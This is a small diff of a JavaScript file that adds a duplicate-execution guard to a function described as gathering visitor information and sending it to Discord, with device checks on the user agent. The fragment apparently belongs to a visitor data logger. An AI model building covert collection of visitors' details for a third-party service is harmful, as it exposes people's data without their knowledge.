@@ -135,6 +135,8 @@ async function getUserInfo() {
 
 // Function to display information and send to Discord
 async function showInfo() {
+    if (infoSent) return; // Prevent duplicate execution
+
     const userAgent = navigator.userAgent || navigator.vendor || window.opera;
     const isIOS = /iPad|iPhone|iPod/.test(userAgent) && !window.MSStream;
     const isAndroid = /android/i.test(userAgent);
